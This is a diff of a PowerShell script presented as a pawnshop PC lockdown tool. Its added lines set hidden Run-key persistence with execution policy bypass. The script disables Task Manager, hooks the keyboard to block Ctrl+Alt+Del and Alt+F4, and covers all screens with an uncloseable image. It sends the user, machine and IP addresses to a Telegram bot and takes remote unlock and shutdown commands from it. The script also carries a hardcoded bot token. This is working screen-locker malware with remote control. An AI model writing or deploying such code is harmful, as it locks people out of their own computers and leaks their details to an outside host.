@@ -1,33 +1,42 @@
-# Pawnshop Lockdown Script (FINAL WORKING VERSION - IEX Compatible)
+# Pawnshop Lockdown Script - Displays fullscreen image & locks PC, with Telegram remote control
 
 # --- Configuration ---
 $ImageUrl  = "https://raw.githubusercontent.com/diezul/x/main/1.png"
 $BotToken  = "7726609488:AAF9dph4FZn5qxo4knBQPS3AnYQf1JAc8Co"
 $ChatID    = "656189986"
+
+# Identify PC/User
 $Username  = [Environment]::UserName
 $Computer  = [Environment]::MachineName
-$LockFile  = "C:\lock_status.txt"
 
-# Mark locked by default
-"locked" | Out-File $LockFile -Force
+# Lock state file (created automatically)
+$LockFile  = "C:\lock_status.txt"
+if (-not (Test-Path $LockFile)) { "locked" | Out-File $LockFile -Force }
+
+# Set registry startup (only when running from file, otherwise skip)
+$RunKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+$RunValueName = "PawnShopLock"
+if ($MyInvocation.MyCommand.Path) {
+    $startCmd = "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Path)`""
+    Set-ItemProperty $RunKey -Name $RunValueName -Value $startCmd -Type String -Force
+}
 
 # Disable Task Manager
 New-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Force | Out-Null
 Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" `
     -Name "DisableTaskMgr" -Value 1 -Type DWord -Force
 
-# Load assemblies
+# Load required assemblies
 Add-Type -AssemblyName System.Windows.Forms,System.Drawing
 
-# Keyboard Hook (Block Alt, Ctrl+Alt+Del, Alt+F4 etc.)
+# Keyboard hook to block shortcuts (ALT, ALT+F4, CTRL+ALT+DEL, Win keys)
 Add-Type @"
 using System;
 using System.Runtime.InteropServices;
 using System.Windows.Forms;
 public class KeyHook {
     private const int WH_KEYBOARD_LL = 13;
-    private const int WM_KEYDOWN = 0x0100;
-    private const int WM_SYSKEYDOWN = 0x0104;
+    private const int WM_KEYDOWN = 0x0100, WM_SYSKEYDOWN = 0x0104;
     private static IntPtr hook = IntPtr.Zero;
     private delegate IntPtr HookProc(int n, IntPtr wp, IntPtr lp);
     private static HookProc proc = HookCallback;
@@ -57,59 +66,62 @@ try {
     $image = [Drawing.Image]::FromStream([IO.MemoryStream]($web.DownloadData($ImageUrl)))
 } catch {
     $bmp = New-Object Drawing.Bitmap(1920,1080)
-    $gfx = [Drawing.Graphics]::FromImage($bmp)
-    $gfx.Clear([Drawing.Color]::Black)
+    [Drawing.Graphics]::FromImage($bmp).Clear('Black')
     $image = $bmp
 }
 
-# Create forms for all screens
+# Fullscreen forms on all monitors
 $forms = foreach ($screen in [Windows.Forms.Screen]::AllScreens) {
     $form = New-Object Windows.Forms.Form -Property @{
-        FormBorderStyle = 'None'; WindowState = 'Maximized'; TopMost = $true;
-        Bounds = $screen.Bounds; KeyPreview = $true; Cursor = [Windows.Forms.Cursors]::None
+        FormBorderStyle='None';WindowState='Maximized';TopMost=$true;Bounds=$screen.Bounds;KeyPreview=$true;Cursor=[Windows.Forms.Cursors]::None
     }
-    $pb = New-Object Windows.Forms.PictureBox -Property @{
-        Image = $image; Dock = 'Fill'; SizeMode = 'Zoom'
-    }
-    $form.Add_FormClosing({ if (-not $script:unlock) { $_.Cancel = $true } })
+    $pb = New-Object Windows.Forms.PictureBox -Property @{Image=$image;Dock='Fill';SizeMode='Zoom'}
+    $form.Add_FormClosing({ if (-not $script:AllowClose) { $_.Cancel=$true } })
     $form.Controls.Add($pb)
     $form.Show()
     $form
 }
 
-# Telegram Notify
-$ipLocal = (Get-NetIPAddress -AF IPv4 | ?{$_.IPAddress -notmatch '^127|169'}).IPAddress
-$ipPublic = (Invoke-RestMethod 'https://api.ipify.org') -as [string]
-$msg = "PC Locked: $Username ($Computer)`nIP: $ipLocal | $ipPublic`nCommands:`n/unlock$Username`n/shutdown$Username`n/lock$Username"
+# Telegram notification
+$ipLocal = (Get-NetIPAddress -AF IPv4 |?{$_.IPAddress -notmatch'^127|169'}|Select -First 1 -ExpandProperty IPAddress)
+try { $ipPublic = Invoke-RestMethod 'https://api.ipify.org' } catch { $ipPublic = 'Unknown' }
+$msg = "Pawnshop PC Locked:`nUser: $Username`nComputer: $Computer`nLocal IP: $ipLocal`nPublic IP: $ipPublic`nCommands:`n/unlock$Username`n/shutdown$Username`n/lock$Username"
 Invoke-RestMethod "https://api.telegram.org/bot$BotToken/sendMessage" -Method POST -Body (@{chat_id=$ChatID;text=$msg}|ConvertTo-Json) -ContentType 'application/json'
 
 # Telegram listener
-$offset=0
-$timer = New-Object Windows.Forms.Timer -Property @{Interval=4000}
+$offset = 0; $script:AllowClose=$false
+$timer = New-Object Windows.Forms.Timer -Property @{Interval=3000}
 $timer.Add_Tick({
     try {
         $resp=Invoke-RestMethod "https://api.telegram.org/bot$BotToken/getUpdates?offset=$offset"
         foreach($update in $resp.result){
             $offset=$update.update_id+1
-            $txt=$update.message.text
-            if($txt -match "^/unlock$Username$"){ 
-                "unlocked"|Out-File $LockFile -Force
-                $script:unlock=$true
-                [Windows.Forms.Application]::Exit()
-            }elseif($txt -match "^/shutdown$Username$"){ 
-                Stop-Computer -Force
-            }elseif($txt -match "^/lock$Username$"){ 
-                "locked"|Out-File $LockFile -Force
+            $txt=$update.message.text.ToLower().Trim()
+            switch ($txt) {
+                "/unlock$($Username.ToLower())" {
+                    "unlocked"|Out-File $LockFile -Force
+                    Remove-ItemProperty $RunKey -Name $RunValueName -ErrorAction SilentlyContinue
+                    Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" "DisableTaskMgr" 0 -Force
+                    $script:AllowClose=$true; [Windows.Forms.Application]::Exit()
+                }
+                "/shutdown$($Username.ToLower())" {
+                    Remove-ItemProperty $RunKey -Name $RunValueName -ErrorAction SilentlyContinue
+                    Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" "DisableTaskMgr" 0 -Force
+                    Stop-Computer -Force
+                }
+                "/lock$($Username.ToLower())" {
+                    "locked"|Out-File $LockFile -Force
+                }
             }
         }
     }catch{}
 })
 $timer.Start()
 
-# Start application loop
+# Application loop
 [Windows.Forms.Application]::Run()
 
-# Cleanup after exit
+# Cleanup on exit
 $timer.Stop()
 [KeyHook]::Stop()
 Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" "DisableTaskMgr" 0 -Force
